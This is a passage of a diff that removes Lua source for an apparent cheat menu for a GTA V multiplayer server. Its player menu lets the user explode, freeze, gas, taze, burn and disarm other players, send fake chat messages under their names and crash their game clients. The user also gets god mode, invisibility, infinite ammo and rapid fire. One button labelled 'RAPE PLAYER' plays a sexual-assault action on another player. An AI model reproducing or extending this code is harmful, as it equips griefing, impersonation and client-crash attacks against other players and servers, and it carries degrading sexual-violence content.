-                local y = FM:TranslateScroller(self.Config.MenuY + 68, scroller_size, scroller_pos)
-                scrolling = true
-                scroller_pos = self:Clamp(y, 0, self.MenuH - 120 - scroller_size)
-            else
-                scroller_y = nil
-                scrolling = false
-            end
-        else
-            self.Painter:DrawText("Selected: " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.SelectedPlayer)) .. " (ID: " .. FM:GetFunction("GetPlayerServerId")(self.SelectedPlayer) .. ")", 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 67, 0.35, 255, 255, 255, 255)
-            local curY = 3
-
-            if self.Painter:Button("BACK", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "go_back", false, 0.35) then
-                self.SelectedPlayer = nil
-                halt = true
-            end
-
-            if not halt then
-                curY = curY + 20
-                local spectate_text = ""
-
-                if self.SpectatingPlayer and FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
-                    spectate_text = " [SPECTATING: " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.SpectatingPlayer)) .. "]"
-                end
-
-                local track_text = ""
-
-                if self.TrackingPlayer and FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
-                    track_text = " [TRACKING: " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.TrackingPlayer)) .. "]"
-                end
-
-                if self.SelectedPlayer ~= FM:GetFunction("PlayerId")() then
-                    if self.Painter:Button("TELEPORT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "teleport_player", false, 0.35) then
-                        local ped = FM:GetFunction("GetPlayerPed")(self.SelectedPlayer)
-                        local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-                        FM:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)
-
-                        if FM:GetFunction("IsPedInAnyVehicle")(ped) and FM:GetFunction("AreAnyVehicleSeatsFree")(FM:GetFunction("GetVehiclePedIsIn")(ped)) then
-                            FM:GetFunction("SetPedIntoVehicle")(FM:GetFunction("PlayerPedId")(), FM:GetFunction("GetVehiclePedIsIn")(ped), -2)
-                        else
-                            FM:GetFunction("SetEntityCoords")(FM:GetFunction("PlayerPedId")(), coords.x, coords.y, coords.z)
-                        end
-
-                        FM:AddNotification("SUCCESS", "Teleported to player.")
-                    end
-
-                    curY = curY + 20
-                end
-
-                if self.SelectedPlayer ~= FM:GetFunction("PlayerId")() then
-                    if self.Painter:Button("TRACK" .. track_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "track_player", false, 0.35) then
-                        if self.TrackingPlayer ~= nil and FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
-                            FM:AddNotification("INFO", "Stopped tracking " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.TrackingPlayer)))
-                            self.TrackingPlayer = nil
-                        else
-                            self.TrackingPlayer = self.SelectedPlayer
-                            FM:AddNotification("INFO", "Tracking " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.TrackingPlayer)), 10000)
-                        end
-                    end
-
-                    curY = curY + 20
-                end
-
-                if self.SelectedPlayer ~= FM:GetFunction("PlayerId")() then
-                    if self.Painter:Button("SPECTATE" .. spectate_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spectate_player", false, 0.35) then
-                        if self.SpectatingPlayer ~= nil and FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
-                            FM:AddNotification("INFO", "Stopped spectating " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.SpectatingPlayer)))
-                            FM:Spectate(false)
-                        else
-                            FM:Spectate(self.SelectedPlayer)
-                            FM:AddNotification("INFO", "Spectating " .. FM:CleanName(FM:GetFunction("GetPlayerName")(self.SpectatingPlayer)), 10000)
-                        end
-                    end
-
-                    curY = curY + 20
-                end
-
-                if self.Painter:Button("EXPLODE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player", false, 0.35) then
-                    FM:GetFunction("AddExplosion")(FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(self.SelectedPlayer), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
-                    FM:AddNotification("INFO", "Player blown up.", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button(frozen_players[self.SelectedPlayer] and "UNFREEZE" or "FREEZE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "freeze_player", false, 0.35) then
-                    frozen_players[self.SelectedPlayer] = not frozen_players[self.SelectedPlayer]
-                    FM:AddNotification("INFO", "Player " .. (frozen_players[self.SelectedPlayer] and "frozen" or "unfrozen") .. ".", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("GIVE ALL WEAPONS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_all_weapons", false, 0.35) then
-                    local ped = FM:GetFunction("GetPlayerPed")(self.SelectedPlayer)
-
-                    for _, wep in dict.pairs(all_weapons) do
-                        FM:GetFunction("GiveWeaponToPed")(ped, FM:GetFunction("GetHashKey")(wep), 9000, false, true)
-                    end
-
-                    FM:AddNotification("SUCCESS", "All weapons given.", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("REMOVE ALL WEAPONS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "remove_player_all_weapons", false, 0.35) then
-                    local ped = FM:GetFunction("GetPlayerPed")(self.SelectedPlayer)
-
-                    for _, wep in dict.pairs(all_weapons) do
-                        FM:GetFunction("RemoveWeaponFromPed")(ped, FM:GetFunction("GetHashKey")(wep), 9000, false, true)
-                    end
-
-                    FM:AddNotification("SUCCESS", "Weapons removed.", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("GAS PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "gas_player", false, 0.35) then
-                    FM:GasPlayer(self.SelectedPlayer)
-
-                    if not FM.Config.SafeMode then
-                        FM:AddNotification("SUCCESS", "Player gassed!", 10000)
-                    end
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("TAZE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "taze_player", false, 0.35) then
-                    FM:TazePlayer(self.SelectedPlayer)
-                    FM:AddNotification("SUCCESS", "Player tazed!", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("HYDRANT PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_player", false, 0.35) then
-                    FM:HydrantPlayer(self.SelectedPlayer)
-                    FM:AddNotification("SUCCESS", "Player sprayed!", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("FIRE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fire_player", false, 0.35) then
-                    FM:FirePlayer(self.SelectedPlayer)
-                    FM:AddNotification("SUCCESS", "Player set on fire!", 10000)
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("KICK FROM VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "kick_player_car", false, 0.35) then
-                    if not FM:GetFunction("IsPedInAnyVehicle")(FM:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
-                        FM:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
-                    else
-                        FM:GetFunction("ClearPedTasksImmediately")(FM:GetFunction("GetPlayerPed")(self.SelectedPlayer))
-                        FM:AddNotification("SUCCESS", "Player kicked from vehicle!", 5000)
-                    end
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("DISABLE VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "disable_player_car", false, 0.35) then
-                    if not FM:GetFunction("IsPedInAnyVehicle")(FM:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
-                        FM:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
-                    else
-                        FM:AddNotification("SUCCESS", "Disabling vehicle.", 5000)
-                        FM:DisableVehicle(FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("GetPlayerPed")(self.SelectedPlayer)))
-                    end
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("RAPE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "rape_player", false, 0.35) then
-                    FM:RapePlayer(self.SelectedPlayer)
-
-                    if not FM.Config.SafeMode then
-                        FM:AddNotification("SUCCESS", "Player raped!", 10000)
-                    end
-                end
-
-                curY = curY + 20
-                local friend_text = friends[FM:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] and "REMOVE FRIEND" or "MARK AS FRIEND"
-
-                if self.Painter:Button(friend_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "friend_toggle", false, 0.35) then
-                    friends[FM:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] = not friends[FM:GetFunction("GetPlayerServerId")(self.SelectedPlayer)]
-                end
-
-                curY = curY + 20
-
-                if self.Painter:Button("STEAL OUTFIT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "steal_player_outfit", false, 0.35) then
-                    FM:StealOutfit(self.SelectedPlayer)
-                    FM:AddNotification("SUCCESS", "Outfit stolen.", 5000)
-                end
-
-                curY = curY + 20
-
-                if self.DynamicTriggers["chat"] and self.DynamicTriggers["chat"]["_chat:messageEntered"] then
-                    if self.Painter:Button("FAKE CHAT MESSAGE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fake_chat_message", false, 0.35) then
-                        local FMM = FM:GetTextInput("Enter message to send.", "", 100)
-                        local playa = FM:GetFunction("GetPlayerName")(self.SelectedPlayer)
-
-                        if FMM then
-                            FM:GetFunction("TriggerServerEvent")(self.DynamicTriggers["chat"]["_chat:messageEntered"], playa, {0, 0x99, 255}, FMM)
-                            FM:AddNotification("SUCCESS", "Message sent!", 10000)
-                        end
-                    end
-
-                    curY = curY + 20
-                end
-
-                if self.Painter:Button("~r~CRASH PLAYER (SHIFT FOR METHOD)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "crash_online_player", false, 0.35) then
-                    local method = nil
-
-                    if FM.Config.SafeMode then
-                        FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-                    else
-                        if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                            local _method = FM:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)
-
-                            if _method then
-                                method = _method
-                                FM:AddNotification("INFO", "Using " .. method .. " crash method.")
-                            end
-                        end
-
-                        FM:CrashPlayer(self.SelectedPlayer, nil, method)
-                    end
-                end
-            end
-        end
-
-        local curX = self.Config.MenuX + 7
-
-        for _, data in dict.pairs(self.Categories) do
-            local size = self.Painter:GetTextWidth(data.Title, 4, 0.34)
-
-            if self.Painter:ListItem(data.Title, curX, self.Config.MenuY + 26, 0, 0, size + 29.6, 20, 0, 0, 0, 200, "category_" .. _) then
-                self.Config.CurrentSelection = _
-                self.Config.SelectedCategory = "category_" .. _
-            end
-
-            curX = curX + size + 29.6 + 2
-        end
-
-        if self.Config.CurrentSelection then
-            self.Categories[self.Config.CurrentSelection].Build(FM, self.Config.MenuX + 5, self.Config.MenuY + 46, 515 + 113, self.MenuH - 28)
-        end
-    end
-
-    local last_clean = 0
-
-    function FM:Cleanup()
-        if last_clean <= FM:GetFunction("GetGameTimer")() then
-            last_clean = FM:GetFunction("GetGameTimer")() + 15000
-            collectgarbage("collect")
-        end
-    end
-
-    local was_showing
-    local was_invis
-    local was_other_invis = {}
-    local was_noragdoll
-    local was_fastrun
-    local walking
-    local magic_carpet_obj
-    local preview_magic_carpet
-    local magic_riding
-    local was_infinite_combat_roll
-    local was_fakedead
-    local fakedead_timer = 0
-    local last_afk_move = 0
-
-    CreateThread(function()
-        while FM.Enabled do
-            Wait(0)
-
-            if FM.Config.Player.RevealInvisibles then
-                for id, src in dict.pairs(FM.PlayerCache) do
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() then
-                        local _ped = FM:GetFunction("GetPlayerPed")(src)
-                        local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
-                        local us = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-                        local dist = FM:GetFunction("GetDistanceBetweenCoords")(where.x, where.y, where.z, us.x, us.y, us.z)
-
-                        if dist <= 100.0 then
-                            local invis = not FM:GetFunction("IsEntityVisibleToScript")(_ped)
-
-                            if invis then
-                                FM:GetFunction("SetEntityLocallyVisible")(_ped, true)
-                                FM:GetFunction("SetEntityAlpha")(_ped, 150)
-                                FM:Draw3DText(where.x, where.y, where.z + 0.3, "*PLAYER INVISIBLE*", 255, 55, 55, 255)
-                                was_other_invis[src] = true
-                            else
-                                FM:GetFunction("SetEntityAlpha")(_ped, 255)
-                                was_other_invis[src] = false
-                            end
-                        else
-                            FM:GetFunction("SetEntityAlpha")(_ped, 255)
-                            was_other_invis[src] = false
-                        end
-                    end
-                end
-            end
-        end
-    end)
-
-    function FM:DoCrosshair()
-        if not FM.Config.Player.CrossHair then return end
-        FM.Painter:DrawRect(FM:ScrW() / 2 - 1, FM:ScrH() / 2 - 7.5, 2, 15, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 255)
-        FM.Painter:DrawRect(FM:ScrW() / 2 - 7.5, FM:ScrH() / 2 - 1, 15, 2, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 255)
-    end
-
-    local _was_anti_afk
-    local sort_func = function(srcA, srcB) return srcA - srcB end
-
-    CreateThread(function()
-        while FM.Enabled do
-            Wait(0)
-            FM.PlayerCache = FM:GetFunction("GetActivePlayers")()
-            local w, h = FM:GetFunction("GetActiveScreenResolution")()
-            local x, y = FM:GetFunction("GetNuiCursorPosition")()
-            FM._ScrW = w
-            FM._ScrH = h
-            FM._MouseX = x
-            FM._MouseY = y
-            if w and h and not FM.Config.NotifX and not FM.Config.NotifY then
-                FM.Config.NotifX = w - FM.Config.NotifW - 20
-                FM.Config.NotifY = 20
-            end
-
-            if not FM.Config.NotifW then
-                FM.Config.NotifW = 420
-            end
-
-            FM:Cleanup()
-            FM:DoESP()
-            FM:DoAntiAim()
-            FM:DoVehicleRelated()
-            FM:DoBlips()
-            FM:Tracker()
-            FM:DoFrozen()
-            FM:DoCrosshair()
-            local keyboard_open = FM:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 2
-
-            if not FM:GetFunction("HasStreamedTextureDictLoaded")("commonmenu") then
-                FM:GetFunction("RequestStreamedTextureDict")("commonmenu")
-            end
-
-            FM:DrawNotifications()
-
-            if walking and not magic_riding then
-                local safe
-
-                if not FM.Showing and FM.Config.UseAutoWalk and not (FM.Config.UseAutoWalkAlt and (FM.FreeCam.On or FM.RCCar.CamOn)) then
-                    safe = true
-                elseif not FM.Config.UseAutoWalk and not (FM.Config.UseAutoWalkAlt and (FM.FreeCam.On or FM.RCCar.CamOn)) then
-                    safe = true
-                elseif not FM.Config.UseAutoWalkAlt and (FM.FreeCam.On or FM.RCCar.CamOn) then
-                    safe = true
-                end
-
-                if not FM.Config.Player.AntiAFK and _was_anti_afk then
-                    safe = true
-                end
-
-                if FM.Config.Player.AntiAFK then
-                    safe = false
-                end
-
-                if safe then
-                    FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                    walking = false
-                end
-            end
-
-            if not walking and not magic_riding then
-                local safe
-
-                if FM.Showing and FM.Config.UseAutoWalk and not (FM.RCCar.CamOn or FM.FreeCam.On) then
-                    safe = true
-                elseif FM.Config.UseAutoWalkAlt and (FM.RCCar.CamOn or FM.FreeCam.On) then
-                    safe = true
-                end
-
-                if was_fakedead or fakedead_timer >= FM:GetFunction("GetGameTimer")() then
-                    safe = false
-                    FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                end
-
-                if FM.Config.Player.AntiAFK then
-                    safe = true
-                end
-
-                if safe then
-                    walking = true
-                    local veh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-                    if FM:GetFunction("DoesEntityExist")(veh) then
-                        FM:GetFunction("TaskVehicleDriveWander")(FM:GetFunction("PlayerPedId")(), veh, 40.0, 0)
-                    else
-                        FM:GetFunction("TaskWanderStandard")(FM:GetFunction("PlayerPedId")(), 10.0, 10)
-                    end
-                end
-            end
-
-            if FM.Showing then
-                FM:GetFunction("DisableAllControlActions")(0)
-                FM:GetFunction("SetMouseCursorActiveThisFrame")()
-                FM:GetFunction("SetMouseCursorSprite")(1)
-                FM:DrawMenu()
-
-                if not was_showing then
-                    selected_config = "none"
-                end
-
-                was_showing = true
-            elseif was_showing then
-                if walking and not FM:GetFunction("IsEntityInAir")(FM:GetFunction("PlayerPedId")()) then
-                    FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                    walking = false
-                end
-
-                was_showing = false
-            end
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys[FM.Config.ShowKey]) and not keyboard_open then
-                FM.Showing = not FM.Showing
-            end
-
-            if FM.Config.FreeCamKey ~= "NONE" and FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys[FM.Config.FreeCamKey]) and not keyboard_open then
-                FM.FreeCam.On = not FM.FreeCam.On
-            end
-
-            if FM.Config.RCCamKey ~= "NONE" and FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys[FM.Config.RCCamKey]) and not keyboard_open then
-                if FM.RCCar.On then
-                    FM.RCCar.CamOn = not FM.RCCar.CamOn
-                else
-                    FM:AddNotification("ERROR", "No RC Car is active!")
-                end
-            end
-
-            if FM.Config.DisableKey ~= "NONE" and FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys[FM.Config.DisableKey]) and not keyboard_open then
-                FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                FM.Enabled = false
-                FM:Print("[MENU] Menu killed.")
-            end
-
-            if FM.Config.Player.ForceRadar then
-                FM:GetFunction("DisplayRadar")(true)
-            end
-
-            if FM.Config.Player.FakeDead then
-                FM:GetFunction("SetPedToRagdoll")(FM:GetFunction("PlayerPedId")(), 1000, 1000, 0, true, true, false)
-                was_fakedead = true
-            elseif was_fakedead then
-                walking = false
-                FM:GetFunction("SetPedToRagdoll")(FM:GetFunction("PlayerPedId")(), 1, 1, 0, true, true, false)
-                FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                was_fakedead = false
-                fakedead_timer = FM:GetFunction("GetGameTimer")() + 1500
-            end
-
-            if FM.Config.Player.SuperJump then
-                FM:GetFunction("SetSuperJumpThisFrame")(PlayerId())
-            end
-
-            if FM.Config.Player.Invisibility then
-                FM:GetFunction("SetEntityVisible")(FM:GetFunction("PlayerPedId")(), false, false)
-                FM:GetFunction("SetEntityLocallyVisible")(FM:GetFunction("PlayerPedId")(), true)
-                FM:GetFunction("SetEntityAlpha")(FM:GetFunction("PlayerPedId")(), 150)
-                was_invis = true
-            elseif was_invis then
-                FM:GetFunction("SetEntityVisible")(FM:GetFunction("PlayerPedId")(), true, true)
-                FM:GetFunction("SetEntityAlpha")(FM:GetFunction("PlayerPedId")(), 255)
-                was_invis = false
-            end
-
-            FM:GetFunction("SetEntityProofs")(FM:GetFunction("PlayerPedId")(), FM.Config.Player.God, FM.Config.Player.God, FM.Config.Player.God, FM.Config.Player.God, FM.Config.Player.God, FM.Config.Player.God, FM.Config.Player.God, FM.Config.Player.God)
-
-            if FM.Config.Player.SemiGod then
-                FM:GetFunction("SetEntityHealth")(FM:GetFunction("PlayerPedId")(), 200)
-            end
-
-            if FM.Config.Player.InfiniteStamina then
-                FM:GetFunction("ResetPlayerStamina")(FM:GetFunction("PlayerId")())
-            end
-
-            if FM.Config.Player.NoRagdoll then
-                FM:GetFunction("SetPedCanRagdoll")(FM:GetFunction("PlayerPedId")(), false)
-                was_noragdoll = true
-            elseif was_noragdoll then
-                FM:GetFunction("SetPedCanRagdoll")(FM:GetFunction("PlayerPedId")(), true)
-                was_noragdoll = false
-            end
-
-            if FM.Config.Player.FastRun then
-                FM:GetFunction("SetRunSprintMultiplierForPlayer")(FM:GetFunction("PlayerId")(), 1.49)
-                FM:GetFunction("SetPedMoveRateOverride")(FM:GetFunction("PlayerPedId")(), 2.0)
-                was_fastrun = true
-            elseif was_fastrun then
-                FM:GetFunction("SetRunSprintMultiplierForPlayer")(FM:GetFunction("PlayerId")(), 1.0)
-                FM:GetFunction("SetPedMoveRateOverride")(FM:GetFunction("PlayerPedId")(), 0.0)
-                was_fastrun = false
-            end
-
-            if FM.Config.Player.NoReload then
-                local curWep = FM:GetFunction("GetSelectedPedWeapon")(FM:GetFunction("PlayerPedId")())
-
-                if curWep ~= FM:GetFunction("GetHashKey")("WEAPON_MINIGUN") then
-                    FM:GetFunction("PedSkipNextReloading")(FM:GetFunction("PlayerPedId")())
-                end
-            end
-
-            if FM.Config.Player.InfiniteAmmo then
-                local curWep = FM:GetFunction("GetSelectedPedWeapon")(FM:GetFunction("PlayerPedId")())
-                local ret, cur_ammo = FM:GetFunction("GetAmmoInClip")(FM:GetFunction("PlayerPedId")(), curWep)
-
-                if ret then
-                    local max_ammo = FM:GetFunction("GetMaxAmmoInClip")(FM:GetFunction("PlayerPedId")(), curWep, 1)
-
-                    if cur_ammo < max_ammo and max_ammo > 0 then
-                        FM:GetFunction("SetAmmoInClip")(FM:GetFunction("PlayerPedId")(), curWep, max_ammo)
-                    end
-                end
-
-                local ret, max = FM:GetFunction("GetMaxAmmo")(FM:GetFunction("PlayerPedId")(), curWep)
-
-                if ret then
-                    FM:GetFunction("SetPedAmmo")(FM:GetFunction("PlayerPedId")(), curWep, max)
-                end
-            end
-
-            if FM.Config.Player.InfiniteAmmo then
-                local curWep = FM:GetFunction("GetSelectedPedWeapon")(FM:GetFunction("PlayerPedId")())
-                local ret, cur_ammo = FM:GetFunction("GetAmmoInClip")(FM:GetFunction("PlayerPedId")(), curWep)
-
-                if ret then
-                    local max_ammo = FM:GetFunction("GetMaxAmmoInClip")(FM:GetFunction("PlayerPedId")(), curWep, 1)
-
-                    if cur_ammo < max_ammo and max_ammo > 0 then
-                        FM:GetFunction("SetAmmoInClip")(FM:GetFunction("PlayerPedId")(), curWep, max_ammo)
-                    end
-                end
-            end
-
-            if FM.Config.Player.RapidFire and IsDisabledControlPressed(0, FM.Keys["MOUSE1"]) and not FM.Showing and (not FM.FreeCam.On and not FM.RCCar.CamOn) then
-                local curWep = FM:GetFunction("GetSelectedPedWeapon")(FM:GetFunction("PlayerPedId")())
-                local cur = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetCurrentPedWeaponEntityIndex")(FM:GetFunction("PlayerPedId")()), 0.0, 0.0, 0.0)
-                local _dir = FM:GetFunction("GetGameplayCamRot")(0)
-                local dir = rot_to_dir(_dir)
-                local dist = FM.Config.Player.NoDrop and 99999.0 or 200.0
-                local len = _multiply(dir, dist)
-                local targ = cur + len
-                FM:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, FM:GetFunction("PlayerPedId")(), true, true, 24000.0)
-
-                if FM.Config.Player.ExplosiveAmmo then
-                    local impact, coords = FM:GetFunction("GetPedLastWeaponImpactCoord")(FM:GetFunction("PlayerPedId")())
-
-                    if impact then
-                        FM:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
-                    end
-                end
-            end
-
-            if not FM.Config.Player.RapidFire and FM.Config.Player.ExplosiveAmmo then
-                local impact, coords = FM:GetFunction("GetPedLastWeaponImpactCoord")(FM:GetFunction("PlayerPedId")())
-
-                if impact then
-                    FM:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
-                end
-
-                FM:GetFunction("SetExplosiveMeleeThisFrame")(FM:GetFunction("PlayerId")())
-            end
-
-            if FM.Config.Player.InfiniteCombatRoll then
-                for i = 0, 3 do
-                    FM:GetFunction("StatSetInt")(FM:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 9999, true)
-                    FM:GetFunction("StatSetInt")(FM:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 9999, true)
-                end
-
-                was_infinite_combat_roll = true
-            elseif was_infinite_combat_roll then
-                for i = 0, 3 do
-                    FM:GetFunction("StatSetInt")(FM:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 0, true)
-                    FM:GetFunction("StatSetInt")(FM:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 0, true)
-                end
-            end
-
-            if FM.Config.Player.MagMode then
-                FM:DoMagneto()
-            end
-
-            FM:DoKeyPressed()
-        end
-    end)
-
-    local _keys = {}
-
-    function FM:DoKeyPressed()
-        if not FM.Config.ShowControlsOnScreen then return end
-        local offY = 0
-        local count = 0
-
-        for name, control in dict.pairs(FM.Keys) do
-            if FM:GetFunction("IsControlJustPressed")(0, control) or FM:GetFunction("IsDisabledControlJustPressed")(0, control) then
-                table.insert(_keys, {
-                    str = name .. "[" .. control .. "]",
-                    expires = FM:GetFunction("GetGameTimer")() + 5000
-                })
-            end
-
-            count = count + 1
-        end
-
-        for _, key in dict.pairs(_keys) do
-            local cur = FM:GetFunction("GetGameTimer")()
-            local left = key.expires - cur
-
-            if left <= 0 then
-                table.remove(_keys, _)
-            else
-                local secs = (left / 1000)
-                local alpha = dict.math.ceil(((left / 1000) / 5) * 255) + 50
-                alpha = _clamp(alpha, 0, 255)
-                offY = offY + 0.024 * _clamp(secs * 4, 0, 1)
-                FM:ScreenText(key.str, 4, 0.0, 0.8, 1 - offY, 0.3, 255, 255, 255, alpha)
-            end
-        end
-    end
-
-    local function _do_riding()
-        if not magic_riding then
-            FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-            local rot = FM:GetFunction("GetEntityRotation")(magic_carpet_obj)
-            FM:GetFunction("SetEntityRotation")(magic_carpet_obj, 0.0, rot.y, rot.z)
-        else
-            local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-            local carpet = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
-            local head = FM:GetFunction("GetEntityHeading")(magic_carpet_obj)
-            FM:GetFunction("SetEntityHeading")(FM:GetFunction("PlayerPedId")(), head)
-            FM:GetFunction("SetEntityCoords")(FM:GetFunction("PlayerPedId")(), carpet.x, carpet.y, carpet.z)
-            FM:GetFunction("TaskPlayAnim")(FM:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
-        end
-    end
-
-    local function _right_vec()
-        local right = vector3(0, 1, 0)
-
-        return right
-    end
-
-    local function _up_vec()
-        local up = vector3(0, 0, 1)
-
-        return up
-    end
-
-    local function _do_flying()
-        if not magic_riding then return end
-        FM.FreeCam:DisableMovement(true)
-
-        if not IsEntityPlayingAnim(FM:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 3) then
-            FM:GetFunction("TaskPlayAnim")(FM:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
-        end
-
-        local carpet = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
-        local rot = FM:GetFunction("GetGameplayCamRot")(0)
-
-        if not FM.FreeCam.On then
-            FM:GetFunction("SetEntityRotation")(magic_carpet_obj, rot.x + 0.0, rot.y + 0.0, rot.z + 0.0)
-            local forwardVec = FM:GetFunction("GetEntityForwardVector")(magic_carpet_obj)
-            local rightVec = _right_vec(magic_carpet_obj)
-            local upVec = _up_vec(magic_carpet_obj)
-            local speed = 1.0
-
-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTCTRL"]) then
-                speed = 0.1
-            elseif FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                speed = 1.8
-            end
-
-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["W"]) then
-                carpet = carpet + forwardVec * speed
-            end
-
-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["S"]) then
-                carpet = carpet - forwardVec * speed
-            end
-
-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["SPACE"]) then
-                carpet = carpet + upVec * speed
-            end
-
